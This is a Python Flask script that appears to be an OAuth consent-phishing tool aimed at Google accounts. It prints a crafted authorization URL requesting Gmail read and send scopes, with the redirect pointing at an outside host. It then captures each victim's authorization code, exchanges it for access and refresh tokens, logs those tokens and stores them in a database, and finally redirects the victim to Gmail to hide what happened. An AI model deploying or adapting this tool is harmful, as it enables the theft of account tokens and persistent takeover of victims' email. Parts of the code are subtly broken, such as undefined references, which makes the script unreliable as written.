#!/usr/bin/python

'''
	!!! You should run this on your server with the correct redirect_uri domain. !!! 
'''
from googleapiclient.discovery import build
from httplib2 import Http
from oauth2client import file, client, tools
from flask import Flask , request ,redirect
import urllib 
import requests 
import json 
import sqlite3 


app = Flask(__name__) 

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class GoogleOauthServer(object):
	def __init__(self):
		self.resultUrl = 'https://accounts.google.com/o/oauth2/v2/auth?redirect_uri={}&prompt=consent&response_type=code&client_id={}&scope={}&access_type=offline'
		self.oauthClientId = ""
		self.oauthSecret = ""
		self.redirectUrl = 'https://tck.bz'
		self.scopes = ['https://www.googleapis.com/auth/gmail.readonly','https://www.googleapis.com/auth/gmail.send'] # add more scope if you want 
		self.token_endpoint = "https://www.googleapis.com/oauth2/v4/token" 

		# setup a db as well 
		self.conn = self.createDbConnection("./googleOauthServer.db")
		self.createTables() 


	def createDbConnection(self,db_file):
		try:
			conn = sqlite3.connect(db_file, check_same_thread=False)
		except Error as e:
			print "[!] Unable to connect to database " + bcolors.WARNING + e + bcolors.ENDC 
			return
		return conn 

	def createTables(self):
		create_user_table_sql = """ CREATE TABLE IF NOT EXISTS users (
                                        id integer PRIMARY KEY,
                                        access_token text NOT NULL,
                                        refresh_token text,
                                        expires_in integer
                                    ); """
		try:
			c = self.conn.cursor()
			c.execute(create_user_table_sql)
		except sqlite3.Error as e:
			print "[!] Unable to connect to database " + bcolors.WARNING + e + bcolors.ENDC
		print "[*] " + bcolors.BOLD + "Database created!" + bcolors.ENDC 

	def createUserRecord(self, access_token, refresh_token, expires_in):
		try:
			c = self.conn.cursor()
			c.execute("INSERT INTO users (access_token, refresh_token, expires_in) VALUES (?,?,?)", [access_token, refresh_token, expires_in])
			self.conn.commit()
		except sqlite3.Error as e :
			print "[!] Failed to insert record " + bcolors.WARNING + e.args[0] + bcolors.ENDC  
			return 
		print "[*] " + bcolors.BOLD + "Record created!" + bcolors.ENDC 

	def createEmailRecord(self):
		return

	def getCraftedURL(self):
		print "[*] Crafted URL : "  + bcolors.BOLD + self.resultUrl.format(self.redirectUrl, self.oauthClientId, '+'.join(self.scopes)) + bcolors.ENDC
		return


	def refreshAccessToken(self):
		# token_endpoint + 
		#client_secret=************&grant_type=refresh_token&refresh_token=1%2FalNma4SvIdoK8M99udGpWkcqu3HYLzVNBNASTfSz3Cc&client_id=407408718192.apps.googleusercontent.com
		# return access_token 
		return 

@app.route('/')
def hello_world():
	user_code = request.args.get('code') # getting exchange token  
	if user_code == None:
		return "Welcome to my site."

	# now we can exchange access_token with client_secret 
	print "[*] code obtained " + bcolors.BOLD + user_code  + bcolors.ENDC
	response = requests.post(self.token_endpoint, data={'code':user_code, 'redirect_uri':g.redirectUrl, 'client_id':g.oauthClientId, 'client_secret':g.oauthSecret, 'grant_type':'authorization_code'})

	if response.status_code == 200:
		responseData = json.loads(response.text)
		print "[*] Access Token obtained : " + bcolors.BOLD + responseData['access_token'] + bcolors.ENDC
		print "[*] Refresh Token obtained : " + bcolors.BOLD + responseData['refresh_token'] + bcolors.ENDC
		g.createUserRecord(responseData['access_token'], responseData['refresh_token'], responseData['expires_in'])
		# let chuck it to db 
	else:
		print "[!] ERROR " + bcolors.WARNING + response.status_code + " " + response.text + bcolors.ENDC 

	# probably just wanna redirect user back to gmail or gdrive or wtever that make sense 
	return redirect("https://gmail.com", code=302)
	#return 'Welcome .'

g = GoogleOauthServer() 
g.getCraftedURL()

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=80)
